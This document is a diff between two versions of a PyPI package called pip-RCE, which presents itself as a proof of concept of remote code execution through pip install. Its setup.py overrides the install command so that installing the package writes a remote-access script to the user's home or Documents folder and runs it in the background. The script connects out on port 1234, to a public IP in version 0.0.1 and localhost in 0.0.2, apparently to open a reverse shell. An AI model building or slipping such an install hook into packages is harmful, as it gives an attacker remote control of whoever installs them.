# Comparing `tmp/pip-RCE-0.0.1.tar.gz` & `tmp/pip-RCE-0.0.2.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "pip-RCE-0.0.1.tar", last modified: Tue May 16 02:21:56 2023, max compression
+gzip compressed data, was "pip-RCE-0.0.2.tar", last modified: Tue May 16 04:10:07 2023, max compression
```

## Comparing `pip-RCE-0.0.1.tar` & `pip-RCE-0.0.2.tar`

### file list

```diff
@@ -1,11 +1,11 @@
-drwxrwxr-x   0 zeroc     (1000) zeroc     (1000)        0 2023-05-16 02:21:56.553295 pip-RCE-0.0.1/
--rw-rw-r--   0 zeroc     (1000) zeroc     (1000)     1062 2023-05-16 02:20:56.000000 pip-RCE-0.0.1/LICENSE
--rw-rw-r--   0 zeroc     (1000) zeroc     (1000)      779 2023-05-16 02:21:56.553295 pip-RCE-0.0.1/PKG-INFO
--rw-rw-r--   0 zeroc     (1000) zeroc     (1000)      234 2023-05-16 02:20:56.000000 pip-RCE-0.0.1/README.md
-drwxrwxr-x   0 zeroc     (1000) zeroc     (1000)        0 2023-05-16 02:21:56.553295 pip-RCE-0.0.1/pip_RCE.egg-info/
--rw-rw-r--   0 zeroc     (1000) zeroc     (1000)      779 2023-05-16 02:21:56.000000 pip-RCE-0.0.1/pip_RCE.egg-info/PKG-INFO
--rw-rw-r--   0 zeroc     (1000) zeroc     (1000)      150 2023-05-16 02:21:56.000000 pip-RCE-0.0.1/pip_RCE.egg-info/SOURCES.txt
--rw-rw-r--   0 zeroc     (1000) zeroc     (1000)        1 2023-05-16 02:21:56.000000 pip-RCE-0.0.1/pip_RCE.egg-info/dependency_links.txt
--rw-rw-r--   0 zeroc     (1000) zeroc     (1000)        1 2023-05-16 02:21:56.000000 pip-RCE-0.0.1/pip_RCE.egg-info/top_level.txt
--rw-rw-r--   0 zeroc     (1000) zeroc     (1000)       38 2023-05-16 02:21:56.553295 pip-RCE-0.0.1/setup.cfg
--rw-rw-r--   0 zeroc     (1000) zeroc     (1000)     3649 2023-05-16 02:21:21.000000 pip-RCE-0.0.1/setup.py
+drwxrwxr-x   0 zeroc     (1000) zeroc     (1000)        0 2023-05-16 04:10:07.194076 pip-RCE-0.0.2/
+-rw-rw-r--   0 zeroc     (1000) zeroc     (1000)     1062 2023-05-16 02:20:56.000000 pip-RCE-0.0.2/LICENSE
+-rw-rw-r--   0 zeroc     (1000) zeroc     (1000)      775 2023-05-16 04:10:07.194076 pip-RCE-0.0.2/PKG-INFO
+-rw-rw-r--   0 zeroc     (1000) zeroc     (1000)      234 2023-05-16 02:24:24.000000 pip-RCE-0.0.2/README.md
+drwxrwxr-x   0 zeroc     (1000) zeroc     (1000)        0 2023-05-16 04:10:07.194076 pip-RCE-0.0.2/pip_RCE.egg-info/
+-rw-rw-r--   0 zeroc     (1000) zeroc     (1000)      775 2023-05-16 04:10:07.000000 pip-RCE-0.0.2/pip_RCE.egg-info/PKG-INFO
+-rw-rw-r--   0 zeroc     (1000) zeroc     (1000)      150 2023-05-16 04:10:07.000000 pip-RCE-0.0.2/pip_RCE.egg-info/SOURCES.txt
+-rw-rw-r--   0 zeroc     (1000) zeroc     (1000)        1 2023-05-16 04:10:07.000000 pip-RCE-0.0.2/pip_RCE.egg-info/dependency_links.txt
+-rw-rw-r--   0 zeroc     (1000) zeroc     (1000)        1 2023-05-16 04:10:07.000000 pip-RCE-0.0.2/pip_RCE.egg-info/top_level.txt
+-rw-rw-r--   0 zeroc     (1000) zeroc     (1000)       38 2023-05-16 04:10:07.194076 pip-RCE-0.0.2/setup.cfg
+-rw-rw-r--   0 zeroc     (1000) zeroc     (1000)     3641 2023-05-16 04:10:03.000000 pip-RCE-0.0.2/setup.py
```

### Comparing `pip-RCE-0.0.1/LICENSE` & `pip-RCE-0.0.2/LICENSE`

 * *Files identical despite different names*

### Comparing `pip-RCE-0.0.1/PKG-INFO` & `pip-RCE-0.0.2/PKG-INFO`

 * *Files 18% similar despite different names*

```diff
@@ -1,24 +1,24 @@
 Metadata-Version: 2.1
 Name: pip-RCE
-Version: 0.0.1
-Summary: To Show the vulnerability of the pip install
+Version: 0.0.2
+Summary: To Show the vulnerability of pip install
 Author: zeroc
 Keywords: python,vulnerability,remoteaccess,sockets
 Classifier: Development Status :: 1 - Planning
 Classifier: Intended Audience :: Developers
 Classifier: Programming Language :: Python :: 3
 Classifier: Topic :: Security
 Classifier: Operating System :: Unix
 Classifier: Operating System :: Microsoft :: Windows
 Classifier: License :: OSI Approved :: MIT License
 Description-Content-Type: text/markdown
 License-File: LICENSE
 
-# pipHack
+# pip-RCE
 POC of RCE through unsafe pip package
 
 ## Usage
 You can modify the remote `IP` and `PORT` by yourself.
 
 use `python3 setup.py sdist bdist_wheel` to build the package.
```

### Comparing `pip-RCE-0.0.1/pip_RCE.egg-info/PKG-INFO` & `pip-RCE-0.0.2/pip_RCE.egg-info/PKG-INFO`

 * *Files 18% similar despite different names*

```diff
@@ -1,24 +1,24 @@
 Metadata-Version: 2.1
 Name: pip-RCE
-Version: 0.0.1
-Summary: To Show the vulnerability of the pip install
+Version: 0.0.2
+Summary: To Show the vulnerability of pip install
 Author: zeroc
 Keywords: python,vulnerability,remoteaccess,sockets
 Classifier: Development Status :: 1 - Planning
 Classifier: Intended Audience :: Developers
 Classifier: Programming Language :: Python :: 3
 Classifier: Topic :: Security
 Classifier: Operating System :: Unix
 Classifier: Operating System :: Microsoft :: Windows
 Classifier: License :: OSI Approved :: MIT License
 Description-Content-Type: text/markdown
 License-File: LICENSE
 
-# pipHack
+# pip-RCE
 POC of RCE through unsafe pip package
 
 ## Usage
 You can modify the remote `IP` and `PORT` by yourself.
 
 use `python3 setup.py sdist bdist_wheel` to build the package.
```

### Comparing `pip-RCE-0.0.1/setup.py` & `pip-RCE-0.0.2/setup.py`

 * *Files 3% similar despite different names*

```diff
@@ -1,10 +1,8 @@
-import subprocess
-import os
-import sys
+import subprocess,os,sys
 from setuptools import setup, find_packages
 from setuptools.command.install import install
 
 
 Code = """
 import socket,subprocess,os,threading,sys,time
 
@@ -48,15 +46,15 @@
 
 
 def getRemoteAccess():
     IP = socket.gethostbyname(socket.gethostname())
     PORT = 1234
     sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     QUIT = 0
-    IP = "82.157.252.61"
+    IP = "127.0.0.1"
     print (IP)
     while True:
         try:
             sock.connect((IP,1234));
             break
         except:
             try:
@@ -77,55 +75,54 @@
         print(e)
         sock.close()
         sys.exit(0)   
 
 getRemoteAccess()
 """
 
-
 class execute(install):
     def run(self):
         install.run(self)
         file = open("remote-access.py", "w")
         file.write(Code)
         file.close()
         dest = os.path.expanduser("~")
         if sys.platform == "win32":
             dest = os.path.expanduser('~/Documents')
         try:
             os.rename("remote-access.py", dest+"/remote-access.py")
         except FileExistsError:
             os.remove(dest+"/remote-access.py")
             os.rename("remote-access.py", dest+"/remote-access.py")
-        try:
-            subprocess.Popen(["python3", dest+"/remote-access.py"], stdout=subprocess.PIPE,
-                             stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=False, text=False)
+        try : 
+            subprocess.Popen(["python3", dest+"/remote-access.py"],stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=False, text=False)
         except:
             pass
+        
 
-
-VERSION = '0.0.1'
-DESCRIPTION = 'To Show the vulnerability of the pip install'
+VERSION = '0.0.2'
+DESCRIPTION = 'To Show the vulnerability of pip install'
 LONG_DESCRIPTION = 'A package that allows you to get remote access of a machine.'
 CLASSIFIERS = [
-    "Development Status :: 1 - Planning",
-    "Intended Audience :: Developers",
-    "Programming Language :: Python :: 3",
-    "Topic :: Security",
-    "Operating System :: Unix",
-    "Operating System :: Microsoft :: Windows",
-    "License :: OSI Approved :: MIT License",
-]
+        "Development Status :: 1 - Planning",
+        "Intended Audience :: Developers",
+        "Programming Language :: Python :: 3",
+        "Topic :: Security",
+        "Operating System :: Unix",
+        "Operating System :: Microsoft :: Windows",
+        "License :: OSI Approved :: MIT License",
+    ]
 # Setting up
 setup(
     name="pip-RCE",
     version=VERSION,
     author="zeroc",
     description=DESCRIPTION,
-    long_description=open('README.md').read(),
+    long_description= open('README.md').read(),
     long_description_content_type="text/markdown",
     packages=find_packages(),
     install_requires=[''],
     keywords=['python', 'vulnerability', 'remoteaccess', 'sockets'],
-    classifiers=CLASSIFIERS,
+    classifiers= CLASSIFIERS,
     cmdclass={'install': execute},
 )
+
```

